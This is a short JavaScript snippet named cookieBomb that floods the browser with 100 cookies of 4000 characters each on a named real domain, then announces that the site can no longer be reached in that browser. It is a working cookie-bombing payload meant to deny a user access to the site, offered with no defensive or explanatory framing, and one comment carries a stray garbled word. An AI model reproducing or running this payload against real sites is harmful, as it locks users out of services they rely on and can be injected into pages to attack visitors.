function cookieBomb() {
    // Set target domain explicitlyzebidz
    const domain = "robly.com";
    
    // Large string to fill the cookies
    const pollution = "a".repeat(4000); // 4000 characters
    
    // Create multiple cookies to flood the browser
    for (let i = 1; i <= 100; i++) {
        document.cookie = `bomb${i}=${pollution}; domain=${domain}; path=/`;
    }
    
    // Notify when complete
    setTimeout(() => {
        alert(`Cookie bomb complete! You can no longer access ${domain} in this browser.`);
    }, 1000);
}

// Run it
cookieBomb();
